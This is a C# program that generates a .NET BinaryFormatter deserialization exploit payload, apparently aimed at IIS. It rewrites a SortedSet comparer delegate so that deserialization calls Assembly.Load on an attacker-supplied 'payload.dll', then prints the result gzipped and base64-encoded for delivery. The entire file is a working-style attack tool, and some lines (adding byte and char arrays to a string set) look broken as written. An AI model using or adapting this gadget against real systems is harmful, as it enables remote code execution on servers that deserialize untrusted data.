using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;

namespace hawktraceiis
{
    class Program
    {
        static void Main(string[] args)
        {
            
            byte[] ASSEMBLY_BYTES = File.ReadAllBytes(@"payload.dll");
            Delegate da = new Comparison<string>(String.IndexOf);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(ASSEMBLY_BYTES);
            set.Add("cea".ToCharArray());
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<byte[], Assembly>(Assembly.Load);
            fi.SetValue(d, invoke_list);
            using (MemoryStream stream = new MemoryStream())
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(stream, set);
                using (MemoryStream compst = new MemoryStream())
                {
                    using (GZipStream gzipStream = new GZipStream(compst, CompressionMode.Compress))
                    {
                        stream.Position = 0;
                        stream.CopyTo(gzipStream);
                    }
                    string gzb4 = Convert.ToBase64String(compst.ToArray());
                    Console.WriteLine(gzb4);
                }
            }
        }
    }
}

